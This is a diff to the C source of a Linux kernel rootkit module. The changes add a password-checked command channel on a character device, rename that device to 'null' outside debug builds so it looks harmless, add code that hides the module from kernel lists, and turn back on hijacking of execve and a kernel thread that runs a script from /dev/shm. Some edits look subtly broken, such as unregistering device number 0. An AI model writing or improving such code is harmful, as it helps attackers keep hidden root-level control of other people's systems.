@@ -5,8 +5,10 @@
 #include <linux/kallsyms.h>
 #include <linux/fs.h>
 #include <linux/init.h>
+#include <linux/cdev.h>
 #include <linux/sched.h>
 #include <linux/delay.h>
+#include <linux/device.h>
 #include <linux/string.h>
 #include <linux/unistd.h>
 #include <asm/uaccess.h>
@@ -17,8 +19,13 @@
 #define RK_DECOY_NAME "httpd"
 #define DEBUG 1
 #define CMD "/dev/shm/rk.sh"
-#define PASSWORD "supersecretpasswordtoruncommands"
-#define DEVICE_NAME "rootkit"
+#define PASSWORD "secret"
+#define PASSWORD_LEN 6
+#ifdef DEBUG
+#define DEVICE_NAME "rk"
+#else
+#define DEVICE_NAME "null"
+#endif
 #define BUF_SIZE 256
 
 
@@ -27,13 +34,13 @@
 	 typeof (b) _b = (b); \
 	 _a < _b ? _a : _b; })
 
-static int version;
 static int open = 0;
 static char msg_buf[BUF_SIZE];
 struct task_struct *rk_kthread;
 unsigned long *syscall_table = NULL;
 unsigned int hidden = 0;
 pte_t *pte;
+
 
 static struct list_head *module_previous;
 static struct list_head *module_kobj_previous;
@@ -64,8 +71,7 @@ device_release(struct inode *inode, struct file *file)
 }
 
 static ssize_t
-device_read(struct file *filp, char *buf, size_t length,
-	    loff_t *offset)
+device_read(struct file *file, char *buf, size_t length, loff_t *offset)
 {
 	return 0;
 }
@@ -79,12 +85,20 @@ device_write(struct file *file, const char __user *buf, size_t len, loff_t *off)
 	printk(KERN_INFO "%s: writing %ld characters.", RK_NAME, len);
 	printk(KERN_INFO "%s: writing buf=%s", RK_NAME, msg_buf);
 #endif
-	// TODO: If msg_buf starts with PASSWORD then execute.
-	if (!strncmp(msg_buf, "hide", MIN(4, len))) {
-		rk_hide();
-	} else if (!strncmp(msg_buf, "unhide", MIN(6, len))) {
-		rk_unhide();
+	if (!strncmp(msg_buf, PASSWORD, MIN(PASSWORD_LEN, len))) {
+		// The 1 is to account for the space.
+		const char *cmd = msg_buf+PASSWORD_LEN+1;
+		int cmd_len = len-PASSWORD_LEN-1;
+#ifdef DEBUG
+		printk(KERN_INFO "%s: cmd=%s", RK_NAME, cmd);
+#endif
+		if (!strncmp(cmd, "hide", MIN(4, cmd_len))) {
+			rk_hide();
+		} else if (!strncmp(cmd, "unhide", MIN(6, cmd_len))) {
+			rk_unhide();
+		}
 	}
+
 	return len;
 }
 
@@ -95,22 +109,14 @@ static struct file_operations fops = {
 	.release = device_release
 };
 
-int rk_dev_init_module(void)
+void rk_dev_init_module(void)
 {
-	version = register_chrdev(0, DEVICE_NAME, &fops);
-	if (version < 0) {
-#ifdef DEBUG
-		printk(KERN_ALERT "Registering device failed with %d\n", version);
-#endif
-		return version;
-	}
-
-	return 0;
+	register_chrdev(0, DEVICE_NAME, &fops);
 }
 
 void rk_dev_cleanup_module(void)
 {
-	unregister_chrdev(version, DEVICE_NAME);
+	unregister_chrdev(0, DEVICE_NAME);
 }
 
 asmlinkage int
@@ -178,6 +184,7 @@ rk_unhide(void)
 	list_add(&THIS_MODULE->list, module_previous);
 	_ = kobject_add(&THIS_MODULE->mkobj.kobj,
 			THIS_MODULE->mkobj.kobj.parent, RK_NAME);
+	list_add(&THIS_MODULE->mkobj.kobj.entry, module_previous);
 
 	hidden = 0;
 }
@@ -254,10 +261,9 @@ rk_init(void)
 	rk_hide();
 #endif
 	rk_dev_init_module();
-#if 0
 	rk_hijack_execve();
 	rk_start_cmd_thread();
-#endif
+
 	return 0;
 }
 
@@ -269,10 +275,8 @@ rk_exit(void)
 	pr_info("%s: module un-loaded at 0x%p\n", RK_NAME, rk_exit);
 #endif
 	rk_dev_cleanup_module();
-#if 0
 	rk_unhijack_execve();
 	kthread_stop(rk_kthread);
-#endif
 }
 
 module_init(rk_init);
